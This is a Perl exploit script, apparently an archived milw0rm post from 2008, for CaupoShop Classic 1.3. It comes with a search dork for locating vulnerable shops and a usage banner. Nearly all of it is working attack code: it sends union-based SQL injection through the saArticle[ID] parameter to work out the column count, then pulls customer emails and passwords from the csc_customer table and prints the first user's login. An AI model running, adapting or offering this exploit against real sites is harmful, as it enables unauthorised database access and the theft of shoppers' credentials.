#!/usr/bin/perl
######################
#
#CaupoShop Classic 1.3 Remote Exploit
#
######################
#
#Bug by: h0yt3r
#
#Dork: inurl:csc_article_details.php
# Couldnt find a stable dork for this specific Version.
#Exploit will only work on correct version.
#
##
###
##
#
#I found this long time ago but never actually shared it.
#As the userid's are a bit messy you will only get the top 1 row value.
#Change it if you like.
#
#Gr33tz go to:
#thund3r, ramon, b!zZ!t, Free-Hack, Sys-Flaw and of course the pwning h4ck-y0u Team
########

use LWP::UserAgent;
my $userAgent = LWP::UserAgent->new;

usage();

$server =   $ARGV[0];
$dir = $ARGV[1];

print"\n";
if (!$dir) { die "Read Usage!\n"; }

$filename ="csc_article_details.php";
my $url = "http://".$server.$dir.$filename."?";

my $Attack= $userAgent->get($url);
if ($Attack->is_success)
{
    print "[x] Attacking ".$url."\n";
}
else
{
    print "Couldn't connect to ".$url."!";
    exit;
}

print "[x] Injecting Black Magic\n";

my @count = ("66666");

for ($i = 6; $i<99; $i++)
{
    my $selectUrl = $url."saArticle[ID]=-275 union select 1,2,3,4, @count";
    my $Attack= $userAgent->get($selectUrl);
    if($Attack->content =~ 66666)
        { last; }
    else
        { push(@count,",66666"); }
}

my $Final = $url."saArticle[ID]=-1 union select 1,2,3,concat(1337,email,0x3a,password,1337), @count from csc_customer";

my $Attack= $userAgent->get($Final);

if($Attack->content =~ m/1337(.*?):(.*?)1337/i)
{
    my $login = $1;
    my $pass = $2;
    print "[x] Success!\n";
    print "[x] Top 1 User Details:\n";

    print "    Username: ".$login."\n";
    print "    Password: ".$pass."\n";
}
else
{
    print"[x] Something wrong...Version?\n";
    exit;

}

sub usage()
{
    print q
    {
    #####################################################
            CaupoShop Classic Remote Exploit
                    -Written by h0yt3r-
    Usage: CC.pl [Server] [Path]
    Sample:
    perl CC.pl www.site.com /shop/
    ######################################################
    };

}
#eof

# milw0rm.com [2008-06-19]